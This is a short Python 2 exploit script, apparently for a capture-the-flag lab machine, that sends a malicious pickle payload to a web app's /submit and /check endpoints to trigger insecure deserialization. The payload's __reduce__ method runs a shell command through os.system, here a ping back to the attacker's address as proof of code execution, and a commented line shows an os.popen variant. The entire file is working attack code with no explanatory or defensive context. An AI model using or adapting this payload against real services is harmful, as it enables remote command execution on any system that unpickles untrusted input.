#!/usr/bin/env python2

import requests
import pickle
import os
from hashlib import md5

class exploit(object):
  def __reduce__(self):
    return (os.system, ('echo homer && ping -c 1 10.10.14.34',))
    # THIS DOESNT WORK
    # return (os.popen, ('echo homer && ping -c 1 10.10.14.34',)) 

def dump_exploit():
  return pickle.dumps(exploit())

payload = dump_exploit()
c = payload[:-1]
q = payload[-1:]
url = 'http://10.10.10.70'

def submit():
  r = requests.post(url + '/submit', data = {'character': c, 'quote': q})

def check():
  r = requests.post(url + '/check', data = {'id': md5(c+q).hexdigest()})

submit()
check()
